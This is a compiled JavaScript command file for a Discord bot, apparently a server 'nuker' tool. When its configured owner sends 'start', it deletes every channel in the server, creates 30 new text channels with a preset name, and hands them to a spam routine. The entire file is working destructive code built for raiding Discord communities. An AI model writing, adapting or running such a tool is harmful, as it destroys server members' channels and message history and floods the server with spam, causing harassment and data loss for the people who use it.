"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const __1 = require("..");
const command = {
    name: "start",
    aliases: [],
    run: async (client, message, args) => {
        try {
            const { userId, channelName, messageContent } = client.config;
            const { guild, author } = message;
            const channels = guild.channels.cache
                .map((channel) => channel);
            const promises = [];
            const spam_channels = [];
            if (author.id !== userId)
                return;
            if (!guild.me.permissions.has(["SEND_MESSAGES", "MANAGE_CHANNELS"]))
                return await author.send({
                    embeds: [{
                            author: {
                                name: guild.name,
                                iconURL: guild.iconURL({
                                    dynamic: true,
                                    size: 64
                                }) ?? undefined
                            },
                            description: `❌ **我沒有** \`發送訊息\` **及** \`管理頻道\` **的權限!**`,
                            color: "RANDOM"
                        }]
                });
            for (const channel of channels)
                channel.delete();
            for (let i = 0; i < 30; i++)
                promises.push(guild.channels.create(channelName, {
                    type: "GUILD_TEXT"
                }));
            for (const promise of promises)
                spam_channels.push(await promise);
            (0, __1.spam)(client, messageContent, spam_channels);
        }
        catch (err) {
            console.log(err);
        }
    }
};
exports.default = command;
